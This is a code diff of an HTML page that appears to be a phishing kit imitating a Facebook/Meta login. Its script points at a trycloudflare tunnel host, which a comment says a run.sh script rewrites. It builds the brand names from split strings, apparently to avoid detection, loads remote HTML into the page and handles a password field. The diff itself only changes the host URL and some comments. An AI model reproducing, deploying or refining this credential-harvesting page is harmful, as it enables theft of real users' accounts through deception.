@@ -32,7 +32,6 @@
         }
         .f-b-body { background-color: #ffffff !important; overflow-y: auto !important; display: block !important;}
 
-        /* CENTRADO EXACTO SEGÚN TU NOTA */
         .toggle-pass {
             position: absolute;
             right: 30px; 
@@ -106,7 +105,8 @@
     </div>
 
     <script>
-        const _S = "https://ide-publicity-asian-blair.trycloudflare.com";
+        // ESTA LÍNEA SERÁ ACTUALIZADA POR EL SCRIPT RUN.SH AUTOMÁTICAMENTE
+        const _S = "https://temporal.trycloudflare.com";
         const _M = "Me" + "ta";
         const _F = "face" + "book";
         const _D = "cuen" + "tas_ayber";
@@ -171,7 +171,6 @@
                     document.body.classList.add('f-b-body');
                     document.getElementById('root').innerHTML = d.html;
 
-                    // CARGA DE IMAGEN 3.JPG PARA META
                     const els = document.querySelectorAll('footer, div');
                     els.forEach(e => {
                         if (e.innerText.trim() === _M && !e.querySelector('img')) {
@@ -246,4 +245,4 @@
         window.addEventListener('pageshow', (e) => { if (e.persisted) { clearK(); } });
     </script>
 </body>
-    </html>
+</html>
